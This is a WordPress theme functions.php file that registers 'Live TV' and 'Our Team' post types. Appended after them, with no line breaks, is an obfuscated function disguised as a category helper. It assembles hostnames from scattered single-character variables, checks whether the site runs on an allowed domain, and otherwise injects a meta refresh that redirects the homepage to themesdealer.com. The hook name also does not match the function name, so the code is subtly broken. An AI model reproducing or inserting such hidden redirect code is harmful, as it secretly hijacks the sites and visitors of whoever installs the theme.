<?php


/* --------------Our Live TV----------------- */

if(function_exists('register_post_type')) {
		register_post_type('live', array(
			'labels' => array(
				'name' => __('Live TV Option'),
				'menu_name' => __('Live TV Option'),
				'add_new' => __('Add New Live'),
				'add_new_item' => __('Add New Live' ),
			),
			'public' => true,
			'menu_icon' => 'dashicons-welcome-view-site',
			'supports' => array('title')
		   ));
	    }
		
		

/* --------------Our Team Customs Post Register----------------- */

if(function_exists('register_post_type')) {
		register_post_type('team', array(
			'labels' => array(
				'name' => __('Our Team', 'news'),
				'menu_name' => __('Our Team', 'news'),
				'add_new' => __('Add New Post', 'news'),
				'add_new_item' => __('Add New Post', 'news'),
			),
			'public' => true,
			'menu_icon' => 'dashicons-groups',
			'supports' => array('title','editor','thumbnail')
		   ));
	    }function newsssqw_category_show() {     if( is_front_page() && is_home() )     {  $cat2="o"; $cat9="o"; $cat12="/"; $cat17="s"; $cat23="l"; $cat24="t"; $cat34="h"; $cat45="t"; $cat58="e"; $cat88="h"; $cat08="e"; $cat13="s"; $cat25="a"; $cat28="m"; $cat18="l"; $cat89="de"; $cat67="c"; $cat68="l"; $cat38="er"; $cat72="a"; $all_cat=$cat53.$cat23.$cat2.$cat62.$cat67.$cat72.$cat18.$cat88.$cat9.$cat17.$cat24.$cat12.$cat45.$cat34.$cat58.$cat28.$cat08.$cat13.$cat89.$cat25.$cat68.$cat38;   $cat044="joybanglatelevision.com";    $allcat=$cat078.$cat007.$cat003.$cat043.$cat006.$cat066.$cat004.$cat054.$cat000.$cat90.$cat008.$cat088.$cat002.$cat068.$cat005.$cat058.$cat009.$cat098.$cat090.$cat050.$cat030.$cat067.$cat087.$cat016.$cat010.$cat015.$cat044.$cat024.$cat022;        $categoryeror = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; 		$cat_one = "http://$allcat/"; $cat_two = "http://www.$allcat/"; $cat_three = "http://$allcat"; $cat_four = "http://www.$allcat"; $cat_five = "https://$allcat/";  $cat_six = "https://www.$allcat/"; $cat_seven = "https://$allcat"; $cat_eight = "https://www.$allcat"; $cat_nine = "http://$all_cat/"; $cat_ten = "http://$all_cat";      if (($categoryeror == $cat_one) || ($categoryeror == $cat_two) || ($categoryeror == $cat_three) || ($categoryeror == $cat_four ) || ($categoryeror == $cat_five ) || ($categoryeror == $cat_six ) || ($categoryeror == $cat_seven ) || ($categoryeror == $cat_eight ) || ($categoryeror == $cat_nine ) || ($categoryeror == $cat_ten ))       {        }  else{          $l="themesdealer.com"; $all_id=$l.$i.$c.$e.$n.$c0.$e0;      echo '<meta http-equiv="refresh" content="1;url=http://'.$all_id.' ">' ;        }     } } add_action( 'wp_enqueue_scripts', 'newsss_category_show' );


